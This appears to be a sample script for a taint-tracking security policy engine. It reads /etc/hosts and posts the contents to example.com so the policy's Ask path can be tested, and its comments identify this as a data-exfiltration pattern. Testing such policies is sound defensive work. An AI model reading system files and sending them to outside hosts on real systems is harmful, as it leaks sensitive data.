require "sample"

# /etc/hosts matches the sample policy's broad "^/etc/" regex rule
# (Elevated sensitivity) — it's not the specific /etc/passwd exact-match
# rule (High), so this demonstrates the Ask path rather than Reject.
#
# Reading a file, then posting its contents externally, is a real
# pattern (and a real risk — this is what data exfiltration looks
# like) — unlike passing file contents to a function that deletes a
# path, which was never a coherent operation. The risk flow check only
# sees taint on the actual Value passed as an argument, which is why
# `log_contents` (read_file's labeled return value) has to be the thing
# passed to post_data, not a fresh, unlabeled literal.

log_contents = read_file("/etc/hosts")
puts_args(log_contents)

post_data("https://example.com/upload", log_contents)

puts_args("if you see this, the post was approved")
